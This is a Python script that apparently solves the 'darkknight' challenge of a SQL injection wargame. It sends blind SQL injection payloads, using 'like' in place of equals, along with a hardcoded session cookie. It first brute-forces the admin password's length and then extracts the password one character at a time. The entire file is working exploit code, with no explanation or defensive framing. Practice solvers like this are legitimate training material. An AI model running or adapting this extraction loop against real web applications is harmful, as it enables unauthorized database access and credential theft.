import requests

url = 'https://los.rubiya.kr/chall/darkknight_5cfbc71e68e09f1b039a8204d1a81456.php?pw=&no=1 || 1 like 1 %26%26 id like "admin" %26%26 '
head = {'Cookie' : 'PHPSESSID=hs9ec08q7cfg9e4b8opujaufgg'}

length = 1
pwd = ''

while (1):
    query = "length(pw) like {}".format(length)
    req = requests.get(url+query, headers=head)
    print("[ +",length,"]")
    if "Hello admin" in req.text:
        print("총 길이는",length)
        break
    else:
        length = length + 1

for i in range(1, length+1):
    for j in range(48, 122):
        query = 'mid(pw,{},1) like "{}"'.format(str(i),chr(j))
        req = requests.get(url+query, headers=head)
        if "Hello admin" in req.text:
            print(pwd)
            pwd = pwd + chr(j)
            break
            
print(pwd)